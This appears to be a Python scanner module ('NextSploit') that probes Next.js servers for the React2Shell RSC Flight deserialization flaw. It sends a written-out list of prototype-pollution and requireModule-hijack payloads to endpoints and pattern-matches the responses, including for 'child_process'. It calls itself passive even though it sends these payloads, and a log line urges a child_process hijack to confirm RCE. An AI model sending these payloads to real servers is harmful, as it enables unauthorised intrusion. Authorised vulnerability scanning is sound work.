#!/usr/bin/env python3
"""
NextSploit — CVE-2025-66478 / CVE-2025-55182: React2Shell
RCE via RSC Flight Protocol Deserialization (CVSS 10.0)

Unsafe deserialization of __proto__ payloads in the RSC Flight Protocol
can hijack the requireModule resolver, leading to RCE via Node.js
child_process. This module operates in PASSIVE detection mode by default.

Detection approach:
  - Probe Server Action endpoints with Flight Protocol content type
  - Send __proto__ / thennable payloads that would trigger deserialization
  - Compare responses — if prototype manipulation causes observable
    server-side behavior change, flag as indicator
  - Look for error messages leaking internal resolver paths

Affected: Next.js 15.x, 16.x, 14.3.0-canary.77+
Fix: 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7
"""

import re
import os
import json
import hashlib
import requests

from core.config import ScanConfig, CVE_DATABASE
from core.reporter import ModuleResult, Finding
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, log_error, print_module_header, print_finding, create_progress,
)

CVE_ID = "CVE-2025-66478"
CVE_INFO = CVE_DATABASE[CVE_ID]

# ─── Flight Protocol Payloads ────────────────────────────────────────────────
# Format: (payload_bytes_or_str, description, risk_level)

FLIGHT_PAYLOADS = [
    # Basic proto pollution via JSON
    (b'{"__proto__":{"admin":true}}', "proto_pollution_admin", "MEDIUM"),
    (b'{"constructor":{"prototype":{"admin":true}}}', "constructor_prototype", "MEDIUM"),

    # Thennable object — hijacks promise resolution (key RCE vector)
    (b'{"then":{"__proto__":{"admin":true}}}', "thennable_proto", "HIGH"),
    (b'[1,{"then":"__import__"}]', "thennable_import", "HIGH"),

    # requireModule hijack attempt (passive — no actual RCE payload)
    (
        b'{"0":"$@1","1":{"id":"__proto__","chunks":[],"name":"","async":false}}',
        "requireModule_hijack",
        "CRITICAL",
    ),

    # Null prototype pollution
    (b'[null,"__proto__","admin"]', "null_proto_array", "MEDIUM"),
    (b'{"__proto__":{"isAdmin":true,"role":"admin"}}', "proto_isAdmin_role", "MEDIUM"),

    # Nested prototype — exhausts resolver depth
    (
        b'{"__proto__":{"__proto__":{"__proto__":{"admin":true}}}}',
        "deep_proto_nesting",
        "LOW",
    ),
]

# Endpoints that process RSC Flight data
FLIGHT_ENDPOINTS = [
    "/",
    "/api",
    "/api/auth",
    "/api/user",
    "/api/data",
    "/wallet",
    "/account",
    "/cryptopedia",
]

# Error patterns that indicate server-side deserialization is happening
DESERIALIZATION_INDICATORS = [
    r"requireModule",
    r"decodeReplyFromBusboy",
    r"React Server",
    r"Flight",
    r"__proto__.*polluted",
    r"prototype.*modified",
    r"Cannot read prop.*of undefined",
    r"child_process",
    r"ReferenceError.*require",
    r"Module.*not found.*__proto__",
]

# Stack trace patterns that reveal internal paths
STACK_TRACE_PATTERNS = [
    r"at Object\.<anonymous>.*next",
    r"node:internal/modules",
    r"webpack.*eval",
    r"/app/\.",
    r"node_modules/next/dist",
]

BOUNDARY = "----WebKitFormBoundaryCVE66478"


def _hash(text: str) -> str:
    return hashlib.md5(text.encode(errors="ignore")).hexdigest()


def _check_deserialization_indicators(text: str) -> list:
    """Check if response contains server-side deserialization fingerprints."""
    found = []
    for pat in DESERIALIZATION_INDICATORS:
        if re.search(pat, text, re.IGNORECASE):
            found.append(pat)
    return found


def _check_stack_trace(text: str) -> list:
    """Check if response leaks internal stack traces."""
    found = []
    for pat in STACK_TRACE_PATTERNS:
        if re.search(pat, text, re.IGNORECASE):
            found.append(pat)
    return found


def scan(config: ScanConfig) -> ModuleResult:
    """
    Scan for CVE-2025-66478 — RSC Flight Protocol RCE (PASSIVE detection).

    Phase 1: Establish Flight Protocol baseline responses
    Phase 2: Send __proto__ / thennable payloads via Next-Action
    Phase 3: Send via multipart/form-data (decodeReplyFromBusboy path)
    Phase 4: Error response analysis for deserialization traces
    """
    result = ModuleResult(
        cve=CVE_ID, title=CVE_INFO["title"],
        severity=CVE_INFO["severity"], status="NOT VULNERABLE",
    )
    print_module_header(CVE_ID, CVE_INFO["title"], CVE_INFO["severity"])
    log_info("[!] Operating in PASSIVE detection mode — no actual RCE payload sent")
    log_info(f"[*] Fix version: {CVE_INFO['fix_version']}")

    session = config.create_session()
    target = config.target.rstrip("/")
    os.makedirs("reports", exist_ok=True)

    # Collect action IDs from fingerprint
    action_ids = list(config.discovered_action_ids) if config.discovered_action_ids else []
    default_ids = ["612d91dd", "fec7a9a5", "action_id_0", "00000000"]
    probe_ids = list(set(action_ids + default_ids))[:15]

    # ── Phase 1: Baseline Flight Protocol Responses ───────────────────────
    log_info("[Phase 1] Establishing Flight Protocol baselines...")
    baselines = {}

    for ep in FLIGHT_ENDPOINTS:
        try:
            # Baseline: valid-looking Flight POST, no proto pollution
            r = session.post(
                f"{target}{ep}",
                headers={
                    "Content-Type": "text/plain;charset=UTF-8",
                    "Accept": "text/x-component",
                    "Next-Action": probe_ids[0] if probe_ids else "00000000",
                },
                data=b'["baseline_test"]',
                timeout=config.timeout,
            )
            baselines[ep] = {
                "hash": _hash(r.text),
                "status": r.status_code,
                "size": len(r.text),
                "content_type": r.headers.get("Content-Type", ""),
            }
            log_debug(f"Baseline [{r.status_code}] {ep} — {len(r.text)} bytes")
        except requests.RequestException:
            baselines[ep] = {"hash": "", "status": 0, "size": 0, "content_type": ""}

    # ── Phase 2: Proto Pollution via Next-Action Header ───────────────────
    log_info("[Phase 2] Sending __proto__ / thennable payloads via Flight Protocol...")
    total = len(FLIGHT_ENDPOINTS) * len(FLIGHT_PAYLOADS)

    with create_progress() as progress:
        task = progress.add_task("Flight Proto Pollution", total=total)

        for ep in FLIGHT_ENDPOINTS:
            baseline = baselines.get(ep, {})

            for payload_bytes, desc, risk in FLIGHT_PAYLOADS:
                progress.update(task, advance=1)

                for action_id in probe_ids[:3]:  # Try first 3 action IDs
                    try:
                        r = session.post(
                            f"{target}{ep}",
                            headers={
                                "Content-Type": "text/plain;charset=UTF-8",
                                "Accept": "text/x-component",
                                "Next-Action": action_id,
                            },
                            data=payload_bytes,
                            timeout=config.timeout,
                        )
                        log_trace(f"[{r.status_code}] {ep} | {desc} | action={action_id}")

                        # Check 1: Deserialization indicators in response
                        deser_hits = _check_deserialization_indicators(r.text)
                        stack_hits = _check_stack_trace(r.text)

                        if deser_hits or stack_hits:
                            detail = (
                                f"Deserialization indicator in Flight Protocol response "
                                f"on {ep} with {desc} "
                                f"(patterns: {', '.join(deser_hits + stack_hits)[:100]})"
                            )
                            log_critical(detail)
                            evidence = {
                                "endpoint": ep,
                                "payload_type": desc,
                                "risk_level": risk,
                                "action_id": action_id,
                                "status_code": r.status_code,
                                "deser_indicators": deser_hits,
                                "stack_traces": stack_hits,
                                "preview": r.text[:500],
                                "cve_note": (
                                    "CVE-2025-66478: If payload reaches deserializer, "
                                    "proto pollution can hijack requireModule → RCE"
                                ),
                            }
                            fname = f"reports/cve66478_{ep.replace('/', '_')}_{desc}.html"
                            try:
                                with open(fname, "w", errors="ignore") as f:
                                    f.write(r.text)
                                evidence["saved_to"] = fname
                            except Exception:
                                pass
                            print_finding(CVE_ID, detail, evidence)
                            result.add_finding(Finding(
                                cve=CVE_ID, severity=risk,
                                title="RSC Flight Protocol Deserialization Indicator",
                                status="VULNERABLE", detail=detail, evidence=evidence,
                            ))

                        # Check 2: Response differs from baseline (proto pollution observable effect)
                        elif (
                            r.status_code == 200
                            and _hash(r.text) != baseline.get("hash", "")
                            and abs(len(r.text) - baseline.get("size", 0)) > 100
                        ):
                            if risk in ("HIGH", "CRITICAL"):
                                detail = (
                                    f"Response differs from baseline for {desc} payload "
                                    f"on {ep} — potential proto pollution effect "
                                    f"(diff: {abs(len(r.text) - baseline.get('size', 0))} bytes)"
                                )
                                log_warning(detail)
                                evidence = {
                                    "endpoint": ep,
                                    "payload_type": desc,
                                    "risk_level": risk,
                                    "action_id": action_id,
                                    "baseline_size": f"{baseline.get('size', 0)} bytes",
                                    "response_size": f"{len(r.text)} bytes",
                                    "note": (
                                        "Response difference may indicate server-side "
                                        "proto pollution. Manual verification recommended."
                                    ),
                                }
                                print_finding(CVE_ID, detail, evidence)
                                result.add_finding(Finding(
                                    cve=CVE_ID, severity="MEDIUM",
                                    title="RSC Flight Protocol Response Anomaly",
                                    status="VULNERABLE", detail=detail, evidence=evidence,
                                ))

                        break  # Don't spam all action IDs if first one gets a response

                    except requests.RequestException:
                        pass

    # ── Phase 3: Multipart Path (decodeReplyFromBusboy) ──────────────────
    log_info("[Phase 3] Testing via multipart (decodeReplyFromBusboy path)...")

    multipart_payloads = [
        (b'{"__proto__":{"admin":true}}', "proto_admin_mp"),
        (b'{"then":{"__proto__":{"admin":true}}}', "thennable_mp"),
        (b'{"0":"$@1","1":{"id":"__proto__","chunks":[],"name":"","async":false}}', "requireModule_mp"),
    ]

    with create_progress() as progress:
        total = len(FLIGHT_ENDPOINTS) * len(multipart_payloads)
        task = progress.add_task("Multipart Deserialization", total=total)

        for ep in FLIGHT_ENDPOINTS:
            baseline = baselines.get(ep, {})

            for payload_bytes, desc in multipart_payloads:
                progress.update(task, advance=1)

                body = (
                    f"--{BOUNDARY}\r\n"
                    f'Content-Disposition: form-data; name="1_$ACTION_ID_0"\r\n\r\n'
                ).encode() + payload_bytes + f"\r\n--{BOUNDARY}--\r\n".encode()

                try:
                    r = session.post(
                        f"{target}{ep}",
                        headers={
                            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
                            "Accept": "text/x-component",
                        },
                        data=body,
                        timeout=config.timeout,
                    )
                    log_trace(f"[{r.status_code}] {ep} multipart | {desc}")

                    deser_hits = _check_deserialization_indicators(r.text)
                    if deser_hits:
                        detail = (
                            f"decodeReplyFromBusboy deserialization indicator on {ep} "
                            f"with {desc} (patterns: {', '.join(deser_hits)[:80]})"
                        )
                        log_critical(detail)
                        evidence = {
                            "endpoint": ep,
                            "payload_type": desc,
                            "path": "multipart/decodeReplyFromBusboy",
                            "deser_indicators": deser_hits,
                            "status_code": r.status_code,
                            "preview": r.text[:500],
                        }
                        print_finding(CVE_ID, detail, evidence)
                        result.add_finding(Finding(
                            cve=CVE_ID, severity="CRITICAL",
                            title="decodeReplyFromBusboy Deserialization Indicator",
                            status="VULNERABLE", detail=detail, evidence=evidence,
                        ))

                except requests.RequestException:
                    pass

    # ── Phase 4: Error Response Analysis ─────────────────────────────────
    log_info("[Phase 4] Error response analysis for internal path leakage...")

    # Send malformed Flight payloads to trigger error messages
    malformed = [
        b"$undefined",
        b"$@invalid",
        b"1:I[invalid]",
        b'{"$":{"__proto__":{}}}',
    ]

    for ep in FLIGHT_ENDPOINTS[:4]:
        for mf in malformed:
            try:
                r = session.post(
                    f"{target}{ep}",
                    headers={
                        "Content-Type": "text/x-component",
                        "Accept": "text/x-component",
                        "Next-Action": probe_ids[0] if probe_ids else "00000000",
                    },
                    data=mf,
                    timeout=config.timeout,
                )
                log_trace(f"[{r.status_code}] {ep} malformed Flight")

                stack_hits = _check_stack_trace(r.text)
                if stack_hits:
                    detail = (
                        f"Internal stack trace in error response on {ep} "
                        f"(patterns: {', '.join(stack_hits)[:80]})"
                    )
                    log_warning(detail)
                    evidence = {
                        "endpoint": ep,
                        "malformed_payload": mf.decode(errors="replace"),
                        "stack_patterns": stack_hits,
                        "preview": r.text[:500],
                        "note": "Stack trace may reveal internal module paths exploitable by CVE-2025-66478",
                    }
                    print_finding(CVE_ID, detail, evidence)
                    result.add_finding(Finding(
                        cve=CVE_ID, severity="HIGH",
                        title="Internal Stack Trace Leaked",
                        status="VULNERABLE", detail=detail, evidence=evidence,
                    ))

            except requests.RequestException:
                pass

    # ── Final ─────────────────────────────────────────────────────────────
    if result.finding_count > 0:
        log_critical(f"Found {result.finding_count} CVE-2025-66478 indicators")
        log_warning(
            "[!] Manual verification required: "
            "Send crafted Flight payload with child_process hijack to confirm RCE"
        )
    else:
        log_success("No CVE-2025-66478 deserialization indicators detected")
        log_info("Note: Target may not be running vulnerable Next.js version (14.2.15 detected)")

    return result
